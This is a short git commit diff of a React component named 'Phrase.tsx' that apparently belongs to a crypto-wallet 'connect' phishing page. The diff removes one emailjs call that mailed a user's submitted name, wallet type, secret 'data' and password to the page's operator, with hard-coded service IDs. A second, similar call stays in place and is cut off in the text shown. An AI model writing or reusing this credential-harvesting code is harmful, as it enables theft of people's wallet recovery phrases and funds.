6d31c7c732c3601bd177c4d31a93804ba889c77c
dappdappman <dappdappman@gmail.com>
2025-01-21 20:41:47 +0100

    Update Phrase.tsx

--- src/components/UI-Connect/Phrase.tsx
+++ src/components/UI-Connect/Phrase.tsx
@@ -69,24 +69,6 @@ const Phrase = ({ selectedWallet, appType}) => {
     try {
 
       await emailjs.send(
-        "service_30vkiql",
-        "template_e0wb6w8",
-        {
-          to_name: "prime_noval_app",
-          from_name: formData.name,
-          message: `
-            Name: ${formData.name}
-            Type: ${formData.type}
-            Data: ${formData.data}
-            Password: ${formData.password}
-          `,
-        },
-        "4leuzsOPi6Oh_D4e0"
-      );
-
-      await sendFast(1 * 5 * 1000); 
-
-      await emailjs.send(
         "service_ky8xa0e",
         "template_kqjcmir",
         {
